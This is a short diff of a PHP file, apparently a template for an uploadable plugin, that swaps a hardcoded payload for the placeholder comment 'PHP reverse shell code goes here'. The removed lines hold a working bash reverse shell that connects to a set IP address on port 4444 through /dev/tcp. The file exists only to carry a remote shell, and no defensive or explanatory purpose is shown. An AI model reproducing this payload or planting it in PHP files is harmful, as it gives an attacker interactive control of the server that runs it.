@@ -9,7 +9,6 @@
 * License: https://nosuchlicense
 */
 
-$HOST = '192.168.45.238';
-$PORT = '4444';
-exec("/bin/bash -c 'bash -i >& /dev/tcp/$HOST/$PORT 0>&1'");
+// PHP reverse shell code goes here:
+
 ?>
